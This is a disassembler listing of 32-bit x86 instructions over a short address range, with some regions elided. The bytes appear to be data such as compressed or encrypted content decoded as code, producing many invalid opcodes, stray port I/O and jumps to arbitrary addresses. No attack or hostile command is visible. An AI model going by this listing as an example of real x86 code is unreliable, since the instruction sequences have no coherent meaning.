  41e5d3:	add    BYTE PTR [eax],al
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e607
  41e5e3:	das    
  41e5e4:	imul   dl
  41e5e6:	addr16 inc esi
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	mov    ecx,esp
  41e5f0:	in     eax,dx
  41e5f1:	push   esi
  41e5f2:	add    ah,BYTE PTR [ecx]
  41e5f4:	ror    BYTE PTR [ebx+0x60],1
  41e5f7:	rcl    eax,1
  41e5f9:	stos   BYTE PTR es:[edi],al
  41e5fa:	jae    0x41e5ca
  41e5fc:	xor    ah,BYTE PTR [edi]
  41e5fe:	mov    edx,0xe22a3f1e
  41e603:	cwde   
  41e604:	jmp    0x8b7:0x47edb9e3
  41e60b:	inc    eax
  41e60c:	push   0x29dc2931
  41e611:	out    dx,eax
  41e612:	aaa    
  41e613:	jns    0x41e64c
  41e615:	add    dl,dl
  41e617:	rcl    DWORD PTR [esp+esi*4+0x6caf75ea],cl
  41e61e:	and    bl,cl
  41e620:	push   ebp
  41e621:	out    dx,al
  41e622:	and    edx,esi
  41e624:	popa   
  41e625:	aam    0xc3
  41e627:	ss mov dl,0x69
  41e62a:	xor    eax,DWORD PTR [edi]
  41e62c:	dec    al
  41e62e:	rcl    al,1
  41e630:	loopne 0x41e609
  41e632:	loopne 0x41e5bc
  41e634:	shl    DWORD PTR [edx+0x77],cl
  41e637:	cdq    
  41e638:	movlps QWORD PTR ds:0xd4233457,xmm0
  41e63f:	jo     0x41e694
  41e641:	fldenv [edx-0x74]
  41e644:	js     0x41e619
  41e646:	jge    0x41e611
  41e648:	int    0xcc
  41e64a:	sahf   
  41e64b:	out    0xac,al
  41e64d:	les    ebp,FWORD PTR [edx+0xf]
  41e650:	inc    esp
  41e651:	mov    ds:0xc85ecab6,eax
  41e656:	push   cs
  41e657:	sub    eax,0x126e3119
  41e65c:	push   esi
  41e65d:	pop    esi
  41e65e:	cmc    
  41e65f:	cwde   
  41e660:	nop
  41e661:	lea    ebx,[eax+0x639cbdcc]
  41e667:	fcom   st(1)
  41e669:	push   edx
  41e66a:	ins    DWORD PTR es:[edi],dx
  41e66b:	arpl   WORD PTR [ebp+0x28],ax
  41e66e:	icebp  
  41e66f:	ja     0x41e62a
  41e671:	es mov ecx,0xc739653
  41e677:	std    
  41e678:	cmp    ch,BYTE PTR [edi+0x31e14282]
  41e67e:	(bad)
  41e681:	dec    ecx
  41e682:	jbe    0x41e631
  41e684:	xlat   BYTE PTR ds:[ebx]
  41e685:	aad    0xb8
  41e687:	stos   DWORD PTR es:[edi],eax
  41e688:	xchg   esi,esi
  41e68a:	in     al,dx
  41e68b:	(bad)  
  41e68c:	js     0x41e616
  41e68e:	aad    0x81
  41e690:	out    dx,eax
  41e691:	jbe    0x41e67d
  41e693:	xchg   ecx,eax
  41e694:	pushf  
  41e695:	test   al,0xa6
  41e697:	je     0x41e644
  41e699:	cmp    dh,BYTE PTR [edi-0x6f4f1fec]
  41e69f:	test   DWORD PTR [eax+0x6e5464d5],esi
  41e6a5:	or     eax,0xfd450752
  41e6aa:	sub    ebp,ecx
  41e6ac:	adc    bh,0xc7
  41e6af:	daa    
  41e6b0:	push   ecx
  41e6b1:	add    esp,esp
  41e6b3:	jno    0x41e71a
  41e6b5:	call   0x7e88:0xbc4c2f5
  41e6bc:	adc    BYTE PTR [ecx],al
  41e6be:	call   0x923c:0xbeea09eb
  41e6c5:	fwait
  41e6c6:	aaa    
  41e6c7:	test   DWORD PTR [eax],ebx
  41e6c9:	out    0x40,eax
  41e6cb:	dec    ebp
  41e6cc:	rcl    BYTE PTR [edx+0x5d],0x53
  41e6d0:	ins    BYTE PTR es:[edi],dx
  41e6d1:	xlat   BYTE PTR ds:[ebx]
  41e6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d3:	fisub  WORD PTR [ebp-0x28]
  41e6d6:	push   esp
  41e6d7:	cmp    bl,bl
  41e6d9:	ja     0x41e6b0
  41e6db:	psubusw mm6,QWORD PTR [edx]
  41e6de:	aas    
  41e6df:	sbb    al,0x32
  41e6e1:	sti    
  41e6e2:	or     ah,BYTE PTR [eax]
  41e6e4:	test   BYTE PTR [ebp-0x60],cl
  41e6e7:	imul   esp,DWORD PTR [esi],0x87803bff
  41e6ed:	push   esp
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ebp,DWORD PTR [ebp+0x679d2e66]
  41e767:	inc    edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	jmp    0xfcf095b5
  41e773:	xor    ebp,edx
  41e775:	mov    ah,0x7a
  41e777:	sbb    al,0x2f
  41e779:	loope  0x41e7e4
  41e77b:	and    bl,BYTE PTR [ecx]
  41e77d:	lar    ebx,WORD PTR [ebx]
  41e780:	jns    0x41e730
  41e782:	jnp    0x41e772
  41e784:	mov    ?,WORD PTR [eax-0x3ef85a8f]
  41e78a:	int    0x6d
  41e78c:	fsub   QWORD PTR ds:0xbeb65056
  41e792:	mov    ah,0x2a
  41e794:	mov    WORD PTR [eax*4+0x58e4a853],fs
  41e79b:	outs   dx,BYTE PTR ds:[esi]
  41e79c:	into   
  41e79d:	mov    cl,0x9b
  41e79f:	add    eax,0x9d883754
  41e7a4:	jns    0x41e773
  41e7a6:	push   ds
  41e7a7:	push   ds
  41e7a8:	fadd   st,st(2)
  41e7aa:	je     0x41e7fd
  41e7ac:	add    edx,ebx
  41e7ae:	cmc    
  41e7af:	outs   dx,BYTE PTR ds:[esi]
  41e7b0:	ds loopne 0x41e7b4
  41e7b3:	push   cs
  41e7b4:	stos   DWORD PTR es:[edi],eax
  41e7b5:	mov    dl,0xb
  41e7b7:	fisub  WORD PTR [esp+ecx*2-0x1f]
  41e7bb:	jns    0x41e7eb
  41e7bd:	in     al,0x74
  41e7bf:	inc    esp
  41e7c0:	loop   0x41e75b
  41e7c2:	adc    ah,ch
  41e7c4:	rcl    BYTE PTR [edi-0x2e0fe809],cl
  41e7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7cb:	adc    BYTE PTR [ecx-0x588242b],al
  41e7d1:	xchg   ecx,eax
  41e7d2:	jb     0x41e7d5
  41e7d4:	push   0xffffffcc
  41e7d6:	xchg   ebp,eax
  41e7d7:	xchg   ebx,eax
  41e7d8:	mov    ds:0x5b83ef2e,eax
  41e7dd:	ror    BYTE PTR [ebx+0x13],cl
  41e7e0:	test   bh,bl
  41e7e2:	jecxz  0x41e78d
  41e7e4:	gs jl  0x41e7cd
  41e7e7:	sub    cl,BYTE PTR [di+0x39]
  41e7eb:	sub    eax,0x6a365bd6
  41e7f0:	test   eax,0x43f87cd2
  41e7f5:	test   al,0x9a
  41e7f7:	pop    edi
  41e7f8:	add    BYTE PTR [eax+0x7f],0x49
  41e7fc:	sti    
  41e7fd:	push   edx
  41e7fe:	ror    BYTE PTR [edx-0x21],1
  41e801:	push   edi
  41e802:	cli    
  41e803:	ins    DWORD PTR es:[edi],dx
  41e804:	sbb    BYTE PTR [edx+0x44],0x17
  41e808:	(bad)  
  41e809:	in     al,dx
  41e80a:	aad    0x96
  41e80c:	or     DWORD PTR [eax-0x2c],edi
  41e80f:	mov    ebp,0xcd53211d
  41e814:	adc    al,0xc7
  41e816:	iret   
  41e817:	inc    ebx
  41e818:	pop    ebx
  41e819:	out    dx,eax
  41e81a:	jge    0x41e848
  41e81c:	pop    edi
  41e81d:	push   esi
  41e81e:	push   ecx
  41e81f:	xor    BYTE PTR [ecx-0x4b],cl
  41e822:	jb     0x41e881
  41e824:	adc    edx,DWORD PTR [esi-0x4c41c0e4]
  41e82a:	push   ss
  41e82b:	sahf   
  41e82c:	pop    edx
  41e82d:	or     bl,bh
  41e82f:	out    dx,eax
  41e830:	mov    ah,0x88
  41e832:	inc    esp
  41e833:	mov    al,ds:0x3afba57d
  41e838:	pop    ebx
  41e839:	retf   0xcb98
  41e83c:	push   cs
  41e83d:	pop    esi
  41e83e:	sbb    ebp,DWORD PTR [ecx]
  41e840:	aad    0x74
  41e842:	cmp    al,0xe
  41e844:	xor    ebx,DWORD PTR [edi+0x23576898]
  41e84a:	addr16 dec ebx
  41e84c:	push   ds
  41e84d:	loope  0x41e808
  41e84f:	mov    eax,edx
  41e851:	outs   dx,BYTE PTR ds:[esi]
  41e852:	outs   dx,DWORD PTR ds:[esi]
  41e853:	hlt    
  41e854:	fucom  st(3)
  41e856:	(bad)  
  41e857:	in     al,dx
  41e858:	mov    edx,0xfff1ce19
  41e85d:	es pusha 
  41e85f:	icebp  
  41e860:	sbb    eax,0x27da0932
  41e865:	fist   WORD PTR [ecx-0x1e]
  41e868:	cli    
  41e869:	and    bl,dl
  41e86b:	inc    ebx
  41e86c:	repz add BYTE PTR fs:[eax],al
	...
  41e8d4:	add    BYTE PTR [eax],al
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e8e1
  41e8e3:	jg     0x41e91d
  41e8e5:	ja     0x41e94e
  41e8e7:	dec    eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	or     bl,ch
  41e8f0:	imul   ebp,DWORD PTR [eax],0xffffffb7
  41e8f3:	xchg   esp,eax
  41e8f4:	jecxz  0x41e940
  41e8f6:	in     eax,0x3e
  41e8f8:	outs   dx,BYTE PTR ds:[esi]
  41e8f9:	inc    eax
  41e8fa:	inc    BYTE PTR [ebp-0x25]
  41e8fd:	xor    al,0x1
  41e8ff:	or     eax,0xaafe7b95
  41e904:	mov    WORD PTR [edx+edi*8-0x4affa514],fs
  41e90b:	sbb    dh,BYTE PTR [edi+0xe]
  41e90e:	pushf  
  41e90f:	add    ecx,ebp
  41e911:	test   al,0xac
  41e913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e914:	or     BYTE PTR [esi+0x47],al
  41e917:	or     ebp,esp
  41e919:	jmp    0x9be9bcaa
  41e91e:	push   edx
  41e91f:	call   0xce77543f
  41e924:	mov    ebx,0x81f1e343
  41e929:	cs dec esp
  41e92b:	ds aas 
  41e92d:	out    0xc5,eax
  41e92f:	dec    esi
  41e930:	mov    ecx,0x2f55afa3
  41e935:	xor    al,0x84
  41e937:	lea    ecx,[eax-0x9]
  41e93a:	in     eax,dx
  41e93b:	xchg   edx,eax
  41e93c:	mov    ds:0xd926e665,al
  41e941:	imul   eax,DWORD PTR [esi+0x4247b909],0x5d043cee
  41e94b:	std    
  41e94c:	cli    
  41e94d:	fimul  WORD PTR [edi+0x51]
  41e950:	dec    edi
  41e951:	sub    al,0x74
  41e953:	pop    edi
  41e954:	adc    eax,DWORD PTR [ebp+0x4c69864b]
  41e95a:	dec    esp
  41e95b:	dec    esi
  41e95c:	pop    edx
  41e95d:	push   ecx
  41e95e:	ret    0xfb49
  41e961:	push   0x76871766
  41e966:	xor    ecx,edi
  41e968:	(bad)  
  41e969:	lea    ecx,[edx]
  41e96b:	inc    ebp
  41e96c:	cld    
  41e96d:	sbb    DWORD PTR [ecx],esi
  41e96f:	and    edi,DWORD PTR [esi+0xe]
  41e972:	or     BYTE PTR [edi+0x226469a],bl
  41e978:	call   0x1d19a230
  41e97d:	sub    DWORD PTR [edi+0x1d],ecx
  41e980:	jns    0x41e977
  41e982:	(bad)  
  41e984:	jnp    0x41e996
  41e986:	icebp  
  41e987:	shl    BYTE PTR [ecx-0x37],1
  41e98a:	mov    ds:0x56f865b6,al
  41e98f:	push   0xa82d8bdc
  41e994:	mov    DWORD PTR [edx+0x35],edx
  41e997:	xor    esp,DWORD PTR [esp+eiz*8+0xc]
  41e99b:	out    0x65,al
  41e99d:	cli    
  41e99e:	movsx  eax,BYTE PTR [ecx+0xe]
  41e9a2:	inc    ebp
  41e9a3:	sub    al,0x44
  41e9a5:	lods   eax,DWORD PTR ds:[esi]
  41e9a6:	mov    eax,ds:0xe20fc555
  41e9ab:	shr    BYTE PTR [ebp-0x22],cl
  41e9ae:	mov    ecx,0xe0e9eb6
  41e9b3:	mov    ebp,0xa9acbdac
  41e9b8:	pusha  
  41e9b9:	inc    esp
  41e9ba:	sti    
  41e9bb:	(bad)  [ecx]
  41e9bd:	ds out 0xda,eax
  41e9c0:	pop    ecx
  41e9c1:	int3   
  41e9c2:	cmc    
  41e9c3:	shr    dh,1
  41e9c5:	jbe    0x41e960
  41e9c7:	in     al,0x8
  41e9c9:	(bad)  
  41e9ca:	cld    
  41e9cb:	xchg   edx,eax
  41e9cc:	mov    ah,0xa7
  41e9ce:	adc    eax,0x6a22806f
  41e9d3:	push   ebp
  41e9d4:	mov    ebp,0x924c99f1
  41e9d9:	and    BYTE PTR [eax],bl
  41e9db:	push   cs
  41e9dc:	(bad)  
  41e9de:	mov    eax,0xf2d1fe56
  41e9e3:	(bad)
  41e9e7:	push   ebp
  41e9e8:	xchg   esp,eax
  41e9e9:	daa    
  41e9ea:	lea    ebp,[edx-0x4b]
  41e9ed:	retf   0x0
	...
  41ea54:	add    BYTE PTR [eax],al
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	xchg   ecx,eax
  41ea63:	js     0x41eac8
  41ea65:	aad    0x67
  41ea67:	dec    ecx
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	push   edx
  41ea6f:	fld    QWORD PTR [edi]
  41ea71:	cmc    
  41ea72:	push   0xffffffcf
  41ea74:	and    al,0x81
  41ea76:	ror    cl,0x95
  41ea79:	xchg   edx,eax
  41ea7a:	mov    ah,0x4f
  41ea7c:	cdq    
  41ea7d:	or     BYTE PTR [esi],ch
  41ea7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea80:	int    0x5c
  41ea82:	retf   
  41ea83:	ret    
  41ea84:	retf   
  41ea85:	mov    eax,ds:0x26cc7efb
  41ea8a:	ret    
  41ea8b:	test   DWORD PTR [eax+0xb1f7114],ecx
  41ea91:	ret    
  41ea92:	mov    ebp,0x1272ac24
  41ea97:	jg     0x41ead1
  41ea99:	xchg   esp,eax
  41ea9a:	inc    edi
  41ea9b:	mov    eax,ds:0xc62462d2
  41eaa0:	adc    al,0x6d
  41eaa2:	(bad)  
  41eaa3:	std    
  41eaa4:	dec    ebx
  41eaa5:	push   0x28
  41eaa7:	inc    ebp
  41eaa8:	shl    DWORD PTR [edi-0x384056cd],1
  41eaae:	mov    esi,0xc8d2080d
  41eab3:	push   esi
  41eab4:	or     eax,0xa1e31d1f
  41eab9:	fdivr  DWORD PTR [esi-0x62303b0d]
  41eabf:	stos   BYTE PTR es:[edi],al
  41eac0:	mov    ?,WORD PTR ds:[edi+0x40]
  41eac4:	movq   QWORD PTR [esi+0x48917bc3],mm7
  41eacb:	(bad)  
  41eacc:	jmp    0xf3f4:0x72a6c4d2
  41ead3:	jge    0x41eb22
  41ead5:	pop    esp
  41ead6:	imul   edi,edx,0x3
  41ead9:	xchg   ebx,eax
  41eada:	sbb    BYTE PTR [eax],ah
  41eadc:	jo     0x41eaf4
  41eade:	cdq    
  41eadf:	inc    ebx
  41eae0:	retf   0x56d9
  41eae3:	enter  0xb8b5,0x7c
  41eae7:	imul   ebx,DWORD PTR [ebp-0xd],0x44
  41eaeb:	jp     0x41eb35
  41eaed:	dec    ecx
  41eaee:	int3   
  41eaef:	xor    ah,bl
  41eaf1:	jo     0x41eadf
  41eaf3:	xchg   ebp,eax
  41eaf4:	jo     0x41eb23
  41eaf6:	(bad)  
  41eaf8:	xor    edi,edi
  41eafa:	mov    esp,0x64af28c5
  41eaff:	cli    
  41eb00:	pop    ebx
  41eb01:	and    eax,0x3b9451b9
  41eb06:	int3   
  41eb07:	test   eax,0x4f3933cc
  41eb0c:	stos   DWORD PTR es:[edi],eax
  41eb0d:	in     eax,dx
  41eb0e:	pop    edx
  41eb0f:	cmp    ebx,ebp
  41eb11:	push   ds
  41eb12:	out    0xe3,eax
  41eb14:	push   eax
  41eb15:	xor    bl,BYTE PTR [edi+0x6bcda8b7]
  41eb1b:	retf   
  41eb1c:	hlt    
  41eb1d:	lods   eax,DWORD PTR ds:[esi]
  41eb1e:	cld    
  41eb1f:	sbb    dh,BYTE PTR [esi]
  41eb21:	mov    BYTE PTR [ebx],ch
  41eb23:	addr16 nop
  41eb25:	(bad)  
  41eb26:	std    
  41eb27:	iret   
  41eb28:	sbb    cl,BYTE PTR [ebx+0x11]
  41eb2b:	mov    esi,0x8a3a29f4
  41eb30:	pop    ebp
  41eb31:	test   eax,0xae824dde
  41eb36:	retf   0xa6de
  41eb39:	jmp    0x58a862a2
  41eb3e:	xor    BYTE PTR [edi+0x26],cl
  41eb41:	xchg   ebp,eax
  41eb42:	call   0x65213a48
  41eb47:	ret    0x6604
  41eb4a:	mov    ah,0x5a
  41eb4c:	add    BYTE PTR [ebp-0x52ddde63],dh
  41eb52:	cmp    al,0x47
  41eb54:	adc    DWORD PTR [ecx],ebp
  41eb56:	cmp    eax,0xa9ac0c00
  41eb5b:	and    BYTE PTR [ecx],cl
  41eb5d:	pop    ecx
  41eb5e:	into   
  41eb5f:	mov    bh,0x13
  41eb61:	cmp    DWORD PTR [edi-0x58],esi
  41eb64:	loope  0x41eb4a
  41eb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb67:	fdivr  DWORD PTR [edx+0x4270595c]
  41eb6d:	add    BYTE PTR [eax],0x0
	...
  41ebd4:	add    BYTE PTR [eax],al
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x93
  41ebe3:	mov    dh,0x3b
  41ebe5:	add    eax,0x14a67
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	in     al,dx
  41ebef:	push   edi
  41ebf0:	mov    DWORD PTR [eax+0x29cd0c19],esi
  41ebf6:	inc    ecx
  41ebf7:	lahf   
  41ebf8:	je     0x41ec1c
  41ebfa:	hlt    
  41ebfb:	cmp    al,0x5e
  41ebfd:	inc    ecx
  41ebfe:	sub    al,0x67
  41ec00:	or     eax,0xc89721e0
  41ec05:	fldenv [ebp+ebp*8+0x67b7205e]
  41ec0c:	int    0x28
  41ec0e:	test   al,0x3b
  41ec10:	es cmp eax,0x333a1669
  41ec16:	ins    BYTE PTR es:[edi],dx
  41ec17:	mov    edi,0xc1b524a6
  41ec1c:	cld    
  41ec1d:	call   0xa4324018
  41ec22:	xchg   ebx,eax
  41ec23:	push   ds
  41ec24:	add    eax,0x3ed49d4b
  41ec29:	inc    ebp
  41ec2a:	aas    
  41ec2b:	inc    ebx
  41ec2c:	jmp    0x6d18c3a2
  41ec31:	and    bh,BYTE PTR [edi]
  41ec33:	das    
  41ec34:	rol    DWORD PTR [esi-0x7b],1
  41ec37:	fs pop edi
  41ec39:	aaa    
  41ec3a:	pushf  
  41ec3b:	outs   dx,DWORD PTR ds:[esi]
  41ec3c:	int    0x82
  41ec3e:	sub    al,0xd8
  41ec40:	pop    ecx
  41ec41:	xor    eax,0xc3c4608c
  41ec46:	jb     0x41ec79
  41ec48:	idiv   esp
  41ec4a:	nop
  41ec4b:	rol    edi,cl
  41ec4d:	std    
  41ec4e:	adc    eax,0xb912f274
  41ec53:	mov    ebx,esi
  41ec55:	adc    ch,BYTE PTR [ebp*2+0x4a7b4538]
  41ec5c:	sub    ch,BYTE PTR [ecx+ecx*1-0x7a]
  41ec60:	sub    DWORD PTR [ebx-0x4f5de3f9],ebx
  41ec66:	pushf  
  41ec67:	mov    DWORD PTR [esi-0x1377b657],ebx
  41ec6d:	adc    BYTE PTR [esi+0x43],ch
  41ec70:	push   ebp
  41ec71:	ret    0xda6f
  41ec74:	xchg   esp,eax
  41ec75:	cdq    
  41ec76:	mov    esi,0xbc11a348
  41ec7b:	add    BYTE PTR [edx],0x6b
  41ec7e:	cmc    
  41ec7f:	shl    BYTE PTR [edi-0x25],0x3
  41ec83:	mov    dh,BYTE PTR [ebp+0x41]
  41ec86:	push   ebp
  41ec87:	out    0xa1,al
  41ec89:	cmp    esp,DWORD PTR [ebx+0x3a]
  41ec8c:	mov    cl,0xa6
  41ec8e:	in     al,0xab
  41ec90:	lock fild DWORD PTR [ecx]
  41ec93:	mov    cl,0xbb
  41ec95:	lds    esp,FWORD PTR [esi+esi*4+0x52b3c025]
  41ec9c:	(bad)  
  41ec9d:	sbb    DWORD PTR [edi+0x3d],ecx
  41eca0:	jo     0x41ed20
  41eca2:	inc    esp
  41eca3:	pusha  
  41eca4:	aam    0xba
  41eca6:	inc    edi
  41eca7:	push   edx
  41eca8:	sbb    eax,esi
  41ecaa:	dec    edx
  41ecab:	in     eax,dx
  41ecac:	push   es
  41ecad:	ins    BYTE PTR es:[edi],dx
  41ecae:	pop    ss
  41ecaf:	cmp    ebp,DWORD PTR [esi-0x1d]
  41ecb2:	sbb    bh,BYTE PTR [edi+0x4019df3f]
  41ecb8:	dec    esi
  41ecb9:	push   ebp
  41ecba:	adc    al,BYTE PTR [eax-0x11]
  41ecbd:	les    ebp,FWORD PTR [ecx-0x4637275b]
  41ecc3:	jns    0x41ec87
  41ecc5:	inc    ecx
  41ecc6:	data16 mov al,0x0
  41ecc9:	jo     0x41ed0b
  41eccb:	and    BYTE PTR ss:[ecx+0x2ced816e],cl
  41ecd2:	sub    edi,edi
  41ecd4:	ins    BYTE PTR es:[edi],dx
  41ecd5:	sbb    ecx,DWORD PTR [edi-0x54ca71b3]
  41ecdb:	je     0x41ed38
  41ecdd:	adc    ah,bl
  41ecdf:	adc    eax,0x270c0935
  41ece4:	sbb    esi,DWORD PTR [esi+0x2d]
  41ece7:	popf   
  41ece8:	inc    ebx
  41ece9:	cmp    BYTE PTR [si-0x4b97],cl
	...
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xe665fd0
  41ed64:	fmul   DWORD PTR [eax]
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	xchg   ebp,eax
  41ed6f:	leave  
  41ed70:	jg     0x41ed97
  41ed72:	sti    
  41ed73:	dec    eax
  41ed74:	ficom  WORD PTR [esp+ebx*2+0xa890218]
  41ed7b:	cmc    
  41ed7c:	push   ebx
  41ed7d:	push   ebp
  41ed7e:	adc    cl,BYTE PTR [esi+0x5c212089]
  41ed84:	into   
  41ed85:	and    dh,BYTE PTR [ebx+0x36efb1e3]
  41ed8b:	adc    BYTE PTR [eax+0x62],ah
  41ed8e:	xchg   ecx,eax
  41ed8f:	call   0xe1fb1b5f
  41ed94:	push   edi
  41ed95:	pusha  
  41ed96:	or     BYTE PTR [ecx+0x75a60d00],bh
  41ed9c:	enter  0xf0c1,0xf6
  41eda0:	out    dx,eax
  41eda1:	ins    DWORD PTR es:[edi],dx
  41eda2:	pop    ebp
  41eda3:	stos   BYTE PTR es:[edi],al
  41eda4:	mov    ebx,DWORD PTR [edx]
  41eda6:	icebp  
  41eda7:	mov    ecx,0x4faa84f7
  41edac:	(bad)  
  41edad:	retf   
  41edae:	cmp    DWORD PTR [ecx-0x12],eax
  41edb1:	(bad)  
  41edb2:	jae    0x41ed61
  41edb4:	mov    WORD PTR [edi-0x27],es
  41edb7:	mov    ebp,0xa2380ec6
  41edbc:	cmp    al,BYTE PTR [edi+esi*1+0x7]
  41edc0:	in     al,0x55
  41edc2:	dec    ebp
  41edc3:	push   ss
  41edc4:	push   ss
  41edc5:	loopne 0x41edd3
  41edc7:	mov    cl,0x77
  41edc9:	xchg   DWORD PTR [esi+ecx*4-0x4e],edx
  41edcd:	into   
  41edce:	aas    
  41edcf:	call   0x50e36a1e
  41edd4:	ins    BYTE PTR es:[edi],dx
  41edd5:	sbb    ebp,esp
  41edd7:	and    ecx,ecx
  41edd9:	iret   
  41edda:	push   eax
  41eddb:	mov    DWORD PTR [ebx+0x17],0xb2c55dc6
  41ede2:	call   0xae97:0x20ef723e
  41ede9:	xchg   BYTE PTR [eax+0x32dcf705],al
  41edef:	push   0x44
  41edf1:	pop    esp
  41edf2:	ja     0x41edfd
  41edf4:	ds xchg ebp,eax
  41edf6:	or     al,0xcf
  41edf8:	hlt    
  41edf9:	test   DWORD PTR cs:[ecx+0xe119ea5],ebp
  41ee00:	cwde   
  41ee01:	sub    eax,0xbc9e232d
  41ee06:	test   al,0xdb
  41ee08:	test   eax,0x8d57ce54
  41ee0d:	cmp    edi,eax
  41ee0f:	pop    ecx
  41ee10:	cs jmp 0x2c2eef10
  41ee16:	fdiv   QWORD PTR [edi+0x7da8a778]
  41ee1c:	es (bad) 
  41ee1f:	addr16 loope 0x41ee1e
  41ee22:	fldenv [ebx+0x780cfeb4]
  41ee28:	adc    DWORD PTR [edx-0x1f0f8d63],edi
  41ee2e:	addr16 cld 
  41ee30:	stc    
  41ee31:	cmc    
  41ee32:	mov    ebp,0xa6bfb4c
  41ee37:	test   al,0xf0
  41ee39:	scas   al,BYTE PTR es:[edi]
  41ee3a:	neg    bl
  41ee3c:	nop
  41ee3d:	sbb    al,0xb
  41ee3f:	shl    BYTE PTR [edx],cl
  41ee41:	dec    edi
  41ee42:	fsub   DWORD PTR [esi]
  41ee44:	aaa    
  41ee45:	out    0x84,eax
  41ee47:	add    esp,DWORD PTR [eax+edx*2-0x16ccc353]
  41ee4e:	mov    ecx,0x3f1b1498
  41ee53:	pusha  
  41ee54:	sbb    al,0x73
  41ee56:	fucomi st,st(5)
  41ee59:	jbe    0x41ede7
  41ee5b:	fidiv  DWORD PTR [esp+esi*2+0x3b3b7433]
  41ee62:	pusha  
  41ee63:	mov    edx,0x42064dd1
  41ee68:	and    BYTE PTR [edx-0x19ddb8ba],0x0
	...
  41eed3:	add    BYTE PTR [eax],al
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x672f:0x8ef80de7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	adc    BYTE PTR [ebx+edx*8],al
  41eef1:	cmp    BYTE PTR [ebp-0x1d17a65a],ch
  41eef7:	add    al,ch
  41eef9:	nop
  41eefa:	adc    eax,0xbff13a7c
  41eeff:	mov    al,ds:0xee97ddd6
  41ef04:	add    cl,ch
  41ef06:	add    dl,BYTE PTR [eax-0x159daa08]
  41ef0c:	jo     0x41ef29
  41ef0e:	sti    
  41ef0f:	hlt    
  41ef10:	call   0xa28a56e8
  41ef15:	and    al,0xa0
  41ef17:	nop
  41ef18:	mov    al,ds:0x7b9923bf
  41ef1d:	out    0x89,al
  41ef1f:	cmp    BYTE PTR [edx+eax*4],cl
  41ef22:	adc    dl,BYTE PTR [ebx]
  41ef24:	jmp    0x8c075aea
  41ef29:	sub    bl,ch
  41ef2b:	das    
  41ef2c:	push   ss
  41ef2d:	mov    edx,0xcb2e1563
  41ef32:	(bad)  
  41ef33:	adc    ecx,edi
  41ef35:	sar    BYTE PTR [edi],0xce
  41ef38:	fs mov al,fs:0x4a6affe7
  41ef3f:	in     al,dx
  41ef40:	add    al,0xb
  41ef42:	data16 arpl dx,cx
  41ef45:	bound  eax,QWORD PTR [eax]
  41ef47:	mov    dl,0xca
  41ef49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef4a:	imul   edx,DWORD PTR [edx+edx*2-0x62a7e8b7],0x5be7cd8f
  41ef55:	or     BYTE PTR [ecx],ah
  41ef57:	in     eax,0x2a
  41ef59:	cs push ds
  41ef5b:	inc    esp
  41ef5c:	call   0x48d7381d
  41ef61:	sub    DWORD PTR [edi+0x7ff7138d],edx
  41ef67:	fs inc esp
  41ef69:	popa   
  41ef6a:	fsub   DWORD PTR [eax-0x3b6fd438]
  41ef70:	fisttp WORD PTR [edi]
  41ef72:	jmp    0x5ec6:0x5d551df8
  41ef79:	inc    esi
  41ef7a:	mov    gs,ebp
  41ef7c:	clc    
  41ef7d:	sub    edi,DWORD PTR [edi-0x7a]
  41ef80:	mov    ds:0x905c5857,eax
  41ef85:	nop
  41ef86:	sbb    ebx,ebx
  41ef88:	mov    edx,0x5f664736
  41ef8d:	ds enter 0x9d32,0x55
  41ef92:	mov    dl,0x27
  41ef94:	mov    dl,0xeb
  41ef96:	lea    ebp,[eax]
  41ef98:	dec    ebx
  41ef99:	pop    ds
  41ef9a:	adc    eax,0x9daae5c4
  41ef9f:	aas    
  41efa0:	das    
  41efa1:	xor    BYTE PTR [esi-0x7d82ba5d],dh
  41efa7:	stc    
  41efa8:	sub    esi,DWORD PTR [edx+0x118ae84f]
